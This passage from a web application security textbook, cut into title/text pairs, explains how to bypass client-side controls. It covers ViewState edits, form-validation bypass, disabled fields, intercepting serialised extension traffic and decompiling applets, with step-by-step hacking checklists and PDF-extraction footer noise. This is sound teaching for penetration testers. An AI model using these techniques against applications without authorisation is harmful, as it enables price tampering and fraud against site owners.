ViewState\ntree. When you send the message to the server or client, Burp sends your updated\nViewState, and, in the present example, enables you to change the price of the\nitem being purchased.\nFigure 5-3: Burp Proxy can decode and render the ViewState, allowing you to\nreview its contents and edit these if the EnableViewStateMac option is not set\ncc0055..iinndddd 112266 88//1199//22001111 1122::0055::4411 PPMM"
  },
  {
    "input": "Capturing User Data: HTML Forms",
    "output": "Stuttard c05.indd V3 - 07/22/2011 Page 127\nChapter 5 n Bypassing Client-Side Controls 127\nTRY IT!\nhttp://mdsec.net/shop/76/\nHACK STEPS\n1. If you are attacking an ASP.NET application, verify whether MAC protec-\ntion is enabled for the ViewState. This is indicated by the presence of a\n20-byte hash at the end of the ViewState structure, and you can use the\nViewState parser in Burp Suite to confirm whether this is present.\n2. Even if the ViewState is protected, use Burp to decode the ViewState\non various application pages to discover whether the application is using\ntheViewState to transmit any sensitive data via the client.\n3. Try to modify the value of a specific parameter within the ViewState\nwithout interfering with its structure, and see whether an error message\nresults.\n4. If you can modify the ViewState without causing errors, you should\nreview the function of each parameter within the ViewState and\nsee whether the application uses it to store any custom data. Try to\nsubmit crafted values as each parameter to probe for common vulner-\nabilities, as you would for any other item of data being transmitted\nvia the client.\n5. Note that MAC protection may be enabled or disabled on a per-page\nbasis, so it may be necessary to test each significant page of the applica-\ntion for ViewState hacking vulnerabilities. If you are using Burp Scanner\nwith passive scanning enabled, Burp automatically reports any pages that\nuse the ViewState without MAC protection enabled.\nCapturing User Data: HTML Forms\nThe other principal way in which applications use client-side controls to restrict\ndata submitted by clients occurs with data that was not originally specifi ed by\nthe server but that was gathered on the client computer itself.\nHTML forms are the simplest and most common way to capture input from\nthe user and submit it to the server. With the most basic uses of this method,\nusers type data into named text fi elds, which are submitted to the server as\nname/value pairs. However, forms can be used in other ways; they can impose\nrestrictions or perform validation checks on the user-supplied data. When an\ncc0055..iinndddd 112277 88//1199//22001111 1122::0055::4411 PPMM"
  },
  {
    "input": "Length Limits",
    "output": "Stuttard c05.indd V3 - 07/22/2011 Page 128\n128 Chapter 5 n Bypassing Client-Side Controls\napplication employs these client-side controls as a security mechanism to defend\nitself against malicious input, the controls can usually be easily circumvented,\nleaving the application potentially vulnerable to attack.\nLength Limits\nConsider the following variation on the original HTML form, which imposes\na maximum length of 1 on the quantity fi eld:\n<form method=”post” action=”Shop.aspx?prod=1”>\nProduct: iPhone 5 <br/>\nPrice: 449 <br/>\nQuantity: <input type=”text” name=”quantity” maxlength=”1”> <br/>\n<input type=”hidden” name=”price” value=”449”>\n<input type=”submit” value=”Buy”>\n</form>\nHere, the browser prevents the user from entering more than one character\ninto the input fi eld, so the server-side application may assume that the quantity\nparameter it receives will be less than 10. However, this restriction can easily be\ncircumvented either by intercepting the request containing the form submission\nto enter an arbitrary value, or by intercepting the response containing the form\nto remove the maxlength attribute.\nINTERCEPTING RESPONSES\nWhen you attempt to intercept and modify server responses, you may fi nd\nthat the relevant message displayed in your proxy looks like this:\nHTTP/1.1 304 Not Modified\nDate: Wed, 6 Jul 2011 22:40:20 GMT\nEtag: “6c7-5fcc0900”\nExpires: Thu, 7 Jul 2011 00:40:20 GMT\nCache-Control: max-age=7200\nThis response arises because the browser already possesses a cached copy\nof the resource it requested. When the browser requests a cached resource,\nit typically adds two headers to the request — If-Modified-Since and\nIf-None-Match:\nGET /scripts/validate.js HTTP/1.1\nHost: wahh-app.com\nIf-Modified-Since: Sat, 7 Jul 2011 19:48:20 GMT\nIf-None-Match: “6c7-5fcc0900”\nThese headers tell the server when the browser last updated its cached copy.\nThe Etag string, which the server provided with that copy of the resource,\nis a kind of serial number that the server assigns to each cacheable resource.\ncc0055..iinndddd 112288 88//1199//22001111 1122::0055::4411 PPMM"
  },
  {
    "input": "Script-Based Validation",
    "output": "Stuttard c05.indd V3 - 07/22/2011 Page 129\nChapter 5 n Bypassing Client-Side Controls 129\nIt updates each time the resource is modifi ed. If the server possesses a newer\nversion of the resource than the date specifi ed in the If-Modified-Since\nheader, or if the Etag of the current version matches the one specifi ed in the\nIf-None-Match header, the server responds with the latest version of the\nresource. Otherwise, it returns a 304 response, as shown here, informing the\nbrowser that the resource has not been modifi ed and that the browser should\nuse its cached copy.\nWhen this occurs, and you need to intercept and modify the resource that\nthe browser has cached, you can intercept the relevant request and remove\nthe If-Modified-Since and If-None-Match headers. This causes the server\nto respond with the full version of the requested resource. Burp Proxy con-\ntains an option to strip these headers from every request, thereby overriding\nall cache information sent by the browser.\nHACK STEPS\n1. Look for form elements containing a maxlength attribute. Submit data\nthat is longer than this length but that is formatted correctly in other\nrespects (for example, it is numeric if the application expects a number).\n2. If the application accepts the overlong data, you may infer that the client-\nside validation is not replicated on the server.\n3. Depending on the subsequent processing that the application performs\non the parameter, you may be able to leverage the defects in validation to\nexploit other vulnerabilities, such as SQL injection, cross-site scripting, or\nbuffer overflows.\nScript-Based Validation\nThe input validation mechanisms built into HTML forms themselves are extremely\nsimple and are insuffi ciently fi ne-grained to perform relevant validation of\nmany kinds of input. For example, a user registration form might contain fi elds\nfor name, e-mail address, telephone number, and zip code, all of which expect\ndifferent types of input. Therefore, it is common to see customized client-side\ninput validation implemented within scripts. Consider the following variation\non the original example:\n<form method=”post” action=”Shop.aspx?prod=2” onsubmit=”return\nvalidateForm(this)”>\nProduct: Samsung Multiverse <br/>\nPrice: 399 <br/>\ncc0055..iinndddd 112299 88//1199//22001111 1122::0055::4411 PPMM\nStuttard c05.indd V3 - 07/22/2011 Page 130\n130 Chapter 5 n Bypassing Client-Side Controls\nQuantity: <input type=”text” name=”quantity”> (Maximum quantity is 50)\n<br/>\n<input type=”submit” value=”Buy”>\n</form>\n<script>function validateForm(theForm)\n{\nvar isInteger = /^\\d+$/;\nvar valid = isInteger.test(quantity) &&\nquantity > 0 && quantity <= 50;\nif (!valid)\nalert(’Please enter a valid quantity’);\nreturn valid;\n}\n</script>\nTRY IT!\nhttp://mdsec.net/shop/139/\nThe onsubmit attribute of the form tag instructs the browser to execute the\nValidateForm function when the user clicks the Submit button, and to submit\nthe form only if this function returns true. This mechanism enables the client-\nside logic to intercept an attempted form submission, perform customized\nvalidation checks on the user’s input, and decide whether to accept that input.\nIn the preceding example, the validation is simple; it checks whether the data\nentered in the amount fi eld is an integer and is between 1 and 50.\nClient-side controls of this kind are usually easy to circumvent. Usually\nit is suffi cient to disable JavaScript within the browser. If this is done, the\nonsubmit attribute is ignored, and the form is submitted without any custom\nvalidation.\nHowever, disabling JavaScript may break the application if it depends on\nclient-side scripting for its normal operation (such as constructing parts of the\nuser interface). A neater approach is to enter a benign (known good) value into\nthe input fi eld in the browser, intercept the validated submission with your\nproxy, and modify the data to your desired value. This is often the easiest and\nmost elegant way to defeat JavaScript-based validation.\nAlternatively, you can intercept the server’s response that contains the\nJavaScript validation routine and modify the script to neutralize its effect — in\nthe previous example, by changing the ValidateForm function to return true\nin every case.\ncc0055..iinndddd 113300 88//1199//22001111 1122::0055::4422 PPMM"
  },
  {
    "input": "Disabled Elements",
    "output": "Stuttard c05.indd V3 - 07/22/2011 Page 131\nChapter 5 n Bypassing Client-Side Controls 131\nHACK STEPS\n1. Identify any cases where client-side JavaScript is used to perform input\nvalidation prior to form submission.\n2. Submit data to the server that the validation ordinarily would have\nblocked, either by modifying the submission request to inject invalid data\nor by modifying the form validation code to neutralize it.\n3. As with length restrictions, determine whether the client-side controls are\nreplicated on the server and, if not, whether this can be exploited for any\nmalicious purpose.\n4. Note that if multiple input fields are subjected to client-side validation\nprior to form submission, you need to test each field individually with\ninvalid data while leaving valid values in all the other fields. If you submit\ninvalid data in multiple fields simultaneously, the server might stop pro-\ncessing the form when it identifies the first invalid field. Therefore, your\ntesting won’t reach all possible code paths within the application.\nNOTE Client-side JavaScript routines to validate user input are common in\nweb applications, but do not conclude that every such application is vulner-\nable. The application is exposed only if client-side validation is not replicated\non the server, and even then only if crafted input that circumvents client-side\nvalidation can be used to cause some undesirable behavior by the application.\nIn the majority of cases, client-side validation of user input has benefi cial effects\non the application’s performance and the quality of the user experience. For\nexample, when fi lling out a detailed registration form, an ordinary user might\nmake various mistakes, such as omitting required fi elds or formatting his tele-\nphone number incorrectly. In the absence of client-side validation, correcting\nthese mistakes may entail several reloads of the page and round-trip messages\nto the server. Implementing basic validation checks on the client side makes\nthe user’s experience much smoother and reduces the load on the server.\nDisabled Elements\nIf an element on an HTML form is fl agged as disabled, it appears on-screen\nbut is usually grayed out and cannot be edited or used in the way an ordinary\ncontrol can be. Also, it is not sent to the server when the form is submitted. For\nexample, consider the following form:\n<form method=”post” action=”Shop.aspx?prod=5”>\nProduct: Blackberry Rude <br/>\nPrice: <input type=”text” disabled=”true” name=”price” value=”299”>\ncc0055..iinndddd 113311 88//1199//22001111 1122::0055::4422 PPMM\nStuttard c05.indd V3 - 07/22/2011 Page 132\n132 Chapter 5 n Bypassing Client-Side Controls\n<br/>\nQuantity: <input type=”text” name=”quantity”> (Maximum quantity is 50)\n<br/>\n<input type=”submit” value=”Buy”>\n</form>\nThis includes the price of the product as a disabled text fi eld and appears\non-screen as shown in Figure 5-4.\nFigure 5-4: A form containing a disabled input field\nWhen this form is submitted, only the quantity parameter is sent to the\nserver. However, the presence of a disabled fi eld suggests that a price parameter\nmay originally have been used by the application, perhaps for testing purposes\nduring development. This parameter would have been submitted to the server\nand may have been processed by the application. In this situation, you should\ndefi nitely test whether the server-side application still processes this parameter.\nIf it does, seek to exploit this fact.\nTRY IT!\nhttp://mdsec.net/shop/104/\nHACK STEPS\n1. Look for disabled elements within each form of the application. Whenever\nyou find one, try submitting it to the server along with the form’s other\nparameters to determine whether it has any effect.\n2. Often, submit elements are flagged as disabled so that buttons appear\nas grayed out in contexts when the relevant action is unavailable. You\nshould always try to submit the names of these elements to determine\nwhether the application performs a server-side check before attempting\nto carry out the requested action.\ncc0055..iinndddd 113322 88//1199//22001111 1122::0055::4422 PPMM"
  },
  {
    "input": "Capturing User Data: Browser Extensions",
    "output": "Stuttard c05.indd V3 - 07/22/2011 Page 133\nChapter 5 n Bypassing Client-Side Controls 133\n3. Note that browsers do not include disabled form elements when forms\nare submitted. Therefore, you will not identify these if you simply walk\nthrough the application’s functionality, monitoring the requests issued\nby the browser. To identify disabled elements, you need to monitor the\nserver’s responses or view the page source in your browser.\n4. You can use the HTML modification feature in Burp Proxy to automatically\nre-enable any disabled fields used within the application.\nCapturing User Data: Browser Extensions\nBesides HTML forms, the other main method for capturing, validating, and\nsubmitting user data is to use a client-side component that runs in a browser\nextension, such as Java or Flash. When fi rst employed in web applications, browser\nextensions were often used to perform simple and often cosmetic tasks. Now,\ncompanies are increasingly using browser extensions to create fully functional\nclient-side components. These run within the browser, across multiple client\nplatforms, and provide feedback, fl exibility, and handling of a desktop appli-\ncation. A side effect is that processing tasks that previously would have taken\nplace on the server may be offl oaded onto the client for reasons of speed and\nuser experience. In some cases, such as online trading applications, speed is so\ncritical that much of the key application logic takes place on the client side. The\napplication design may deliberately sacrifi ce security in favor of speed, perhaps\nin the mistaken belief that traders are trusted users, or that the browser exten-\nsion includes its own defenses. Recalling the core security problem discussed\nin Chapter 2, and the earlier sections of this chapter, we know that the concept\nof a client-side component defending its business logic is impossible.\nBrowser extensions can capture data in various ways — via input forms\nand in some cases by interacting with the client operating system’s fi lesystem\nor registry. They can perform arbitrarily complex validation and manipula-\ntion of captured data before submission to the server. Furthermore, because\ntheir internal workings are less transparent than HTML forms and JavaScript,\ndevelopers are more likely to assume that the validation they perform cannot\nbe circumvented. For this reason, browser extensions are often a fruitful target\nfor discovering vulnerabilities within web applications.\nA classic example of a browser extension that applies controls on the client\nside is a casino component. Given what we have observed about the fallible\nnature of client-side controls, the idea of implementing an online gambling\napplication using a browser extension that runs locally on a potential attacker’s\ncc0055..iinndddd 113333 88//1199//22001111 1122::0055::4422 PPMM"
  },
  {
    "input": "Common Browser Extension Technologies",
    "output": "Stuttard c05.indd V3 - 07/22/2011 Page 134\n134 Chapter 5 n Bypassing Client-Side Controls\nmachine is intriguing. If any aspect of the game play is controlled within the\nclient instead of by the server, an attacker could manipulate the game with\nprecision to improve the odds, change the rules, or alter the scores submitted\nto the server. Several kinds of attacks could occur in this scenario:\nn The client component could be trusted to maintain the game state. In this\ninstance, local tampering with the game state would give an attacker an\nadvantage in the game.\nn An attacker could bypass a client-side control and perform an illegal action\ndesigned to give himself an advantage within the game.\nn An attacker could fi nd a hidden function, parameter, or resource that,\nwhen invoked, allows illegitimate access to a server-side resource.\nn If the game involves any peers, or a house player, the client component\ncould be receiving and processing information about other players that,\nif known, could be used to the attacker’s advantage.\nCommon Browser Extension Technologies\nThe browser extension technologies you are most likely to encounter are Java\napplets, Flash, and Silverlight. Because these are competing to achieve similar\ngoals, they have similar properties in their architecture that are relevant to\nsecurity:\nn They are compiled to an intermediate bytecode.\nn They execute within a virtual machine that provides a sandbox environ-\nment for execution.\nn They may use remoting frameworks employing serialization to transmit\ncomplex data structures or objects over HTTP.\nJava\nJava applets run in the Java Virtual Machine (JVM) and are subject to the sand-\nboxing applied by the Java Security Policy. Because Java has existed since early\nin the web’s history, and because its core concepts have remained relatively\nunchanged, a large body of knowledge and tools are available for attacking and\ndefending Java applets, as described later in this chapter.\nFlash\nFlash objects run in the Flash virtual machine, and, like Java applets, are sand-\nboxed from the host computer. Once used largely as a method of delivering\nanimated content, Flash has moved on. With newer versions of ActionScript,\ncc0055..iinndddd 113344 88//1199//22001111 1122::0055::4422 PPMM"
  },
  {
    "input": "Intercepting Traffic from Browser Extensions",
    "output": "Stuttard c05.indd V3 - 07/22/2011 Page 135\nChapter 5 n Bypassing Client-Side Controls 135\nFlash is now squarely billed as capable of delivering full-blown desktop applica-\ntions. A key recent change in Flash is ActionScript 3 and its remoting capability\nwith Action Message Format (AMF) serialization.\nSilverlight\nSilverlight is Microsoft’s alternative to Flash. It is designed with the similar goal\nof enabling rich, desktop-like applications, allowing web applications to provide\na scaled-down .NET experience within the browser, in a sandboxed environment.\nTechnically, Silverlight applications can be developed in any .NET-compliant\nlanguage from C# to Python, although C# is by far the most common.\nApproaches to Browser Extensions\nYou need to employ two broad techniques when targeting applications that use\nbrowser extension components.\nFirst, you can intercept and modify the requests made by the component\nand the responses received from the server. In many cases, this is the quickest\nand easiest way to start testing the component, but you may encounter several\nlimitations. The data being transmitted may be obfuscated or encrypted, or may\nbe serialized using schemes that are specifi c to the technology being used. By\nlooking only at the traffi c generated by the component, you may overlook some\nkey functionality or business logic that can be discovered only by analyzing\nthe component itself. Furthermore, you may encounter obstacles to using your\nintercepting proxy in the normal way; however, normally these can be circum-\nvented with some careful confi guration, as described later in this chapter.\nSecond, you can target the component itself directly and attempt to decom-\npile its bytecode to view the original source, or interact dynamically with the\ncomponent using a debugger. This approach has the advantage that, if done\nthoroughly, you identify all the functionality that the component supports or\nreferences. It also allows you to modify key data submitted in requests to the\nserver, regardless of any obfuscation or encryption mechanisms used for data\nin transit. A disadvantage of this approach is that it can be time-consuming\nand may require detailed understanding of the technologies and programming\nlanguages used within the component.\nIn many cases, a combination of both these techniques is appropriate. The\nfollowing sections look at each one in more detail.\nIntercepting Traffi c from Browser Extensions\nIf your browser is already confi gured to use an intercepting proxy, and the\napplication loads a client component using a browser extension, you may see\nrequests from this component passing through your proxy. In some cases, you\ncc0055..iinndddd 113355 88//1199//22001111 1122::0055::4422 PPMM\nStuttard c05.indd V3 - 07/22/2011 Page 136\n136 Chapter 5 n Bypassing Client-Side Controls\ndon’t need to do anything more to begin testing the relevant functionality,\nbecause you can intercept and modify the component’s requests in the usual way.\nIn the context of bypassing client-side input validation that is implemented in\na browser extension, if the component submits the validated data to the server\ntransparently, this data can be modifi ed using an intercepting proxy in the same\nway as already described for HTML form data. For example, a browser exten-\nsion supporting an authentication mechanism might capture user credentials,\nperform some validation on these, and submit the values to the server as plain-\ntext parameters within the request. The validation can be circumvented easily\nwithout performing any analysis or attack on the component itself.\nIn other cases, you may encounter various obstacles that make your testing\ndiffi cult, as described in the following sections.\nHandling Serialized Data\nApplications may serialize data or objects before transmitting them within HTTP\nrequests. Although it may be possible to decipher some of the string-based data\nsimply by inspecting the raw serialized data, in general you need to unpack the\nserialized data before it can be fully understood. And if you want to modify the\ndata to interfere with the application’s processing, fi rst you need to unpack the\nserialized content, edit it as required, and reserialize it correctly. Simply edit-\ning the raw serialized data will almost certainly break the format and cause a\nparsing error when the application processes the message.\nEach browser extension technology comes with its own scheme for serializing\ndata within HTTP messages. In general, therefore, you can infer the serializa-\ntion format based on the type of client component that is being employed, but\nthe format usually is evident in any case from a close inspection of the relevant\nHTTP messages.\nJava Serialization\nThe Java language contains native support for object serialization, and Java\napplets may use this to send serialized data structures between the client and\nserver application components. Messages containing serialized Java objects\nusually can be identifi ed because they have the following Content-Type header:\nContent-Type: application/x-java-serialized-object\nHaving intercepted the raw serialized data using your proxy, you can deserialize\nit using Java itself to gain access to the primitive data items it contains.\nDSer is a handy plug-in to Burp Suite that provides a framework for viewing\nand manipulating serialized Java objects that have been intercepted within Burp.\nThis tool converts the primitive data within the intercepted object into XML\nformat for easy editing. When you have modifi ed the relevant data, DSer then\nreserializes the object and updates the HTTP request accordingly.\ncc0055..iinndddd 113366 88//1199//22001111 1122::0055::4422 PPMM\nStuttard c05.indd V3 - 07/22/2011 Page 137\nChapter 5 n Bypassing Client-Side Controls 137\nYou can download DSer, and learn more about how it works, at the follow-\ning URL:\nhttp://blog.andlabs.org/2010/09/re-visiting-java-de-serialization-it.html\nFlash Serialization\nFlash uses its own serialization format that can be used to transmit complex\ndata structures between server and client components. Action Message Format\n(AMF) normally can be identifi ed via the following Content-Type header:\nContent-Type: application/x-amf\nBurp natively supports AMF format. When it identifi es an HTTP request or\nresponse containing serialized AMF data, it unpacks the content and presents\nthis in tree form for viewing and editing, as shown in Figure 5-5. When you have\nmodifi ed the relevant primitive data items within the structure, Burp reserial-\nizes the message, and you can forward it to the server or client to be processed.\nFigure 5-5: Burp Suite supports AMF format and lets you view and edit the\ndeserialized data\ncc0055..iinndddd 113377 88//1199//22001111 1122::0055::4422 PPMM\nStuttard c05.indd V3 - 07/22/2011 Page 138\n138 Chapter 5 n Bypassing Client-Side Controls\nSilverlight Serialization\nSilverlight applications can make use of the Windows Communication Foundation\n(WCF) remoting framework that is built in to the .NET platform. Silverlight client\ncomponents using WCF typically employ Microsoft’s .NET Binary Format for\nSOAP (NBFS), which can be identifi ed via the following Content-Type header:\nContent-Type: application/soap+msbin1\nA plug-in is available for Burp Proxy that automatically deserializes NBFS-\nencoded data before it is displayed in Burp’s interception window. After you\nhave viewed or edited the decoded data, the plug-in re-encodes the data before\nit is forwarded to the server or client to be processed.\nThe WCF binary SOAP plug-in for Burp was produced by Brian Holyfi eld\nand is available to download here:\nwww.gdssecurity.com/l/b/2009/11/19/wcf-binary-soap-plug-in-for-burp/\nObstacles to Intercepting Traffi c from Browser Extensions\nIf you have set up your browser to use an intercepting proxy, you may fi nd that\nrequests made by browser extension components are not being intercepted by\nyour proxy, or are failing. This problem usually is due to issues with the com-\nponent’s handling of HTTP proxies or SSL (or both). Typically it can be handled\nvia some careful confi guration of your tools.\nThe fi rst problem is that the client component may not honor the proxy con-\nfi guration you have specifi ed in your browser or your computer’s settings. This\nis because components may issue their own HTTP requests, outside of the APIs\nprovided by the browser itself or the extension framework. If this is happen-\ning, you can still intercept the component’s requests. You need to modify your\ncomputer’s hosts fi le to achieve the interception and confi gure your proxy to\nsupport invisible proxying and automatic redirection to the correct destination\nhost. See Chapter 20 for more details on how to do this.\nThe second problem is that the client component may not accept the SSL\ncertifi cate being presented by your intercepting proxy. If your proxy is using a\ngeneric self-signed certifi cate, and you have confi gured your browser to accept it,\nthe browser extension component may reject the certifi cate nonetheless. This may\nbe because the browser extension does not pick up the browser’s confi guration\nfor temporarily trusted certifi cates, or it may be because the component itself\nprogrammatically requires that untrusted certifi cates should not be accepted.\nIn either case, you can circumvent this problem by confi guring your proxy to\nuse a master CA certifi cate, which is used to sign valid per-host certifi cates for\neach site you visit, and installing the CA certifi cate in your computer’s trusted\ncertifi cate store. See Chapter 20 for more details on how to do this.\nIn some rare cases you may fi nd that client components are communicating\nusing a protocol other than HTTP, which simply cannot be handled using an\ncc0055..iinndddd 113388 88//1199//22001111 1122::0055::4433 PPMM"
  },
  {
    "input": "Decompiling Browser Extensions",
    "output": "Stuttard c05.indd V3 - 07/22/2011 Page 139\nChapter 5 n Bypassing Client-Side Controls 139\nintercepting proxy. In these situations, you still may be able to view and modify\nthe affected traffi c by using either a network sniffer or a function-hooking tool.\nOne example is Echo Mirage, which can inject into a process and intercept calls\nto socket APIs, allowing you to view and modify data before it is sent over the\nnetwork. Echo Mirage can be downloaded from the following URL:\nwww.bindshell.net/tools/echomirage\nHACK STEPS\n1. Ensure that your proxy is correctly intercepting all traffic from the browser\nextension. If necessary, use a sniffer to identify any traffic that is not\nbeing proxied correctly.\n2. If the client component uses a standard serialization scheme, ensure that\nyou have the tools necessary to unpack and modify it. If the component\nis using a proprietary encoding or encryption mechanism, you need to\ndecompile or debug the component to fully test it.\n3. Review responses from the server that trigger key client-side logic. Often,\ntimely interception and modification of a server response may allow you\nto “unlock” the client GUI, making it easy to reveal and then perform\ncomplex or multistaged privileged actions.\n4. If the application performs any critical logic or events that the client com-\nponent should not be trusted to perform (such as drawing a card or rolling\ndice in a gambling application), look for any correlation between execu-\ntion of critical logic and communication with the server. If the client does\nnot communicate with the server to determine the outcome of the event,\nthe application is definitely vulnerable.\nDecompiling Browser Extensions\nBy far the most thorough method of attacking a browser extension component\nis to decompile the object, perform a full review of the source code, and if nec-\nessary modify the code to change the object’s behavior, and recompile it. As\nalready discussed, browser extensions are compiled into bytecode. Bytecode is a\nhigh-level platform-independent binary representation that can be executed by\nthe relevant interpreter (such as the Java Virtual Machine or Flash Player), and\neach browser extension technology uses its own bytecode format. As a result,\nthe application can run on any platform that the interpreter itself can run on.\nThe high-level nature of bytecode representation means that it is always\ntheoretically possible to decompile the bytecode into something resembling the\noriginal source code. However, various defensive techniques can be deployed to\ncause the decompiler to fail, or to output decompiled code that is very diffi cult\nto follow and interpret.\ncc0055..iinndddd 113399 88//1199//22001111 1122::0055::4433 PPMM\nStuttard c05.indd V3 - 07/22/2011 Page 140\n140 Chapter 5 n Bypassing Client-Side Controls\nSubject to these obfuscation defenses, decompiling bytecode normally is the\npreferable route to understanding and attacking browser extension components.\nThis allows you to review business logic, assess the full functionality of the\nclient-side application, and modify its behavior in targeted ways.\nDownloading the Bytecode\nThe fi rst step is to download the executable bytecode for you to start working\non. In general, the bytecode is loaded in a single fi le from a URL specifi ed within\nthe HTML source code for application pages that run the browser extension.\nJava applets generally are loaded using the <applet> tag, and other components\ngenerally are loaded using the <object> tag. For example:\n<applet code=”CheckQuantity.class” codebase=”/scripts”\nid=”CheckQuantityApplet”>\n</applet>\nIn some cases, the URL that loads the bytecode may be less immediately obvi-\nous, since the component may be loaded using various wrapper scripts provided\nby the different browser extension frameworks. Another way to identify the\nURL for the bytecode is to look in your proxy history after your browser has\nloaded the browser extension. If you take this approach, you need to be aware\nof two potential obstacles:\nn Some proxy tools apply fi lters to the proxy history to hide from view items\nsuch as images and style sheet fi les that you generally are less interested\nin. If you cannot fi nd a request for the browser extension bytecode, you\nshould modify the proxy history display fi lter so that all items are visible.\nn Browsers usually cache the downloaded bytecode for extension components\nmore aggressively than they do for other static resources such as images.\nIf your browser has already loaded the bytecode for a component, even\ndoing a full refresh for a page that uses the component may not cause\nthe browser to request the component again. In this eventuality, you may\nneed to fully clear your browser’s cache, shut down every instance of the\nbrowser, and then start a fresh browser session to force your browser to\nrequest the bytecode again.\nWhen you have identifi ed the URL for the browser extension’s bytecode, usu-\nally you can just paste this URL into your browser’s address bar. Your browser\nthen prompts you to save the bytecode fi le on your local fi lesystem.\nTIP If you have identifi ed the request for the bytecode in your Burp Proxy\nhistory, and the server’s response contains the full bytecode (and not a ref-\nerence to an earlier cached copy), you can save the bytecode directly to fi le\ncc0055..iinndddd 114400 88//1199//22001111 1122::0055::4433 PPMM\nStuttard c05.indd V3 - 07/22/2011 Page 141\nChapter 5 n Bypassing Client-Side Controls 141\nfrom within Burp. The most reliable way to do this is to select the Headers tab\nwithin the response viewer, right-click the lower pane containing the response\nbody, and select Copy to File from the context menu.\nDecompiling the Bytecode\nBytecode usually is distributed in a single-fi le package, which may need to be\nunpacked to obtain the individual bytecode fi les for decompilation into source\ncode.\nJava applets normally are packaged as .jar (Java archive) fi les, and Silverlight\nobjects are packaged as .xap fi les. Both of these fi le types use the zip archive\nformat, so you can easily unpack them by renaming the fi les with the .zip\nextension and then using any zip reader to unpack them into the individual fi les\nthey contain. The Java bytecode is contained in .class fi les, and the Silverlight\nbytecode is contained in .dll fi les. After unpacking the relevant fi le package,\nyou need to decompile these fi les to obtain source code.\nFlash objects are packaged as .swf fi les and don’t require any unpacking\nbefore you use a decompiler.\nTo perform the actual bytecode decompilation, you need to use some specifi c\ntools, depending on the type of browser extension technology that is being used,\nas described in the following sections.\nJava Tools\nJava bytecode can be decompiled to into Java source code using a tool called\nJad (the Java decompiler), which is available from:\nwww.varaneckas.com/jad\nFlash Tools\nFlash bytecode can be decompiled into ActionScript source code. An alternative\napproach, which is often more effective, is to disassemble the bytecode into a\nhuman-readable form, without actually fully decompiling it into source code.\nTo decompile and disassemble Flash, you can use the following tools:\nn Flasm — www.nowrap.de/flasm\nn Flare — www.nowrap.de/flare\nn SWFScan — www.hp.com/go/swfscan (this works for Actionscript 2 and 3)\nSilverlight Tools\nSilverlight bytecode can be decompiled into source code using a tool called\n.NET Refl ector, which is available from:\nwww.red-gate.com/products/dotnet-development/reflector/\ncc0055..iinndddd 114411 88//1199//22001111 1122::0055::4433 PPMM\nStuttard c05.indd V3 - 07/22/2011 Page 142\n142 Chapter 5 n Bypassing Client-Side Controls\nWorking on the Source Code\nHaving obtained the source code for the component, or something resembling\nit, you can take various approaches to attacking it. The fi rst step generally is\nto review the source code to understand how the component works and what\nfunctionality it contains or references. Here are some items to look for:\nn Input validation or other security-relevant logic and events that occur\non the client side\nn Obfuscation or encryption routines being used to wrap user-supplied\ndata before it is sent to the server\nn “Hidden” client-side functionality that is not visible in your user interface\nbut that you might be able to unlock by modifying the component\nn References to server-side functionality that you have not previously identi-\nfi ed via your application mapping\nOften, reviewing the source code uncovers some interesting functions\nwithin the component that you want to modify or manipulate to identify\npotential security vulnerabilities. This may include removing client-side\ninput validation, submitting nonstandard data to the server, manipulating\nclient-side state or events, or directly invoking functionality that is present\nwithin the component.\nYou can modify the component’s behavior in several ways, as described in\nthe following sections.\nRecompiling and Executing Within the Browser\nYou can modify the decompiled source code to change the component’s behav-\nior, recompile it to bytecode, and execute the modifi ed component within your\nbrowser. This approach is often preferred when you need to manipulate key\nclient-side events, such as the rolling of dice in a gaming application.\nTo perform the recompilation, you need to use the developer tools that are\nrelevant to the technology you are using:\nn For Java, use the javac program in the JDK to recompile your modifi ed\nsource code.\nn For Flash, you can use flasm to reassemble your modifi ed bytecode or\none of the Flash development studios from Adobe to recompile modifi ed\nActionScript source code.\nn For Silverlight, use Visual Studio to recompile your modifi ed source code.\nHaving recompiled your source code into one or more bytecode fi les, you\nmay need to repackage the distributable fi le if required for the technology\nbeing used. For Java and Silverlight, replace the modifi ed bytecode fi les in your\ncc0055..iinndddd 114422 88//1199//22001111 1122::0055::4433 PPMM\nStuttard c05.indd V3 - 07/22/2011 Page 143\nChapter 5 n Bypassing Client-Side Controls 143\nunpacked archive, repackage using a zip utility, and then change the extension\nback to .jar or .xap as appropriate.\nThe fi nal step is to load your modifi ed component into your browser so that\nyour changes can take effect within the application you are testing. You can\nachieve this in various ways:\nn If you can fi nd the physical fi le within your browser’s on-disk cache that\ncontains the original executable, you can replace this with your modifi ed\nversion and restart your browser. This approach may be diffi cult if your\nbrowser does not use a different individual fi le for each cached resource\nor if caching of browser extension components is implemented only in\nmemory.\nn Using your intercepting proxy, you can modify the source code of the\npage that loads the component and specify a different URL, pointing to\neither the local fi lesystem or a web server that you control. This approach\nnormally is diffi cult because changing the domain from which the com-\nponent is loaded may violate the browser’s same origin policy and\nmay require reconfi guring your browser or other methods to weaken\nthis policy.\nn You can cause your browser to reload the component from the original\nserver (as described in the earlier section “Downloading the Bytecode”),\nuse your proxy to intercept the response containing the executable, and\nreplace the body of the message with your modifi ed version. In Burp\nProxy, you can use the Paste from File context menu option to achieve\nthis. This approach usually is the easiest and least likely to run into the\nproblems described previously.\nRecompiling and Executing Outside the Browser\nIn some cases, it is not necessary to modify the component’s behavior while it\nis being executed. For example, some browser extension components validate\nuser-supplied input and then obfuscate or encrypt the result before sending\nit to the server. In this situation, you may be able to modify the component to\nperform the required obfuscation or encryption on arbitrary unvalidated input\nand simply output the result locally. You can then use your proxy to intercept the\nrelevant request when the original component submits the validated input, and\nyou can replace this with the value that was output by your modifi ed component.\nTo carry out this attack, you need to change the original executable, which is\ndesigned to run within the relevant browser extension, into a standalone pro-\ngram that can be run on the command line. The way this is done depends on\nthe programming language being used. For example, in Java you simply need\nto implement a main method. The section “Java Applets: A Worked Example”\ngives an example of how to do this.\ncc0055..iinndddd 114433 88//1199//22001111 1122::0055::4444 PPMM\nStuttard c05.indd V3 - 07/22/2011 Page 144\n144 Chapter 5 n Bypassing Client-Side Controls\nManipulating the Original Component Using JavaScript\nIn some cases, it is not necessary to modify the component’s bytecode. Instead,\nyou may be able to achieve your objectives by modifying the JavaScript within\nthe HTML page that interacts with the component.\nHaving reviewed the component’s source code, you can identify all its public\nmethods that can be invoked directly from JavaScript, and the way in which\nparameters to those methods are handled. Often, more methods are available\nthan are ever called from within application pages, and you may also discover\nmore about the purpose and handling of parameters to these methods.\nFor example, a component may expose a method that can be invoked to enable\nor disable 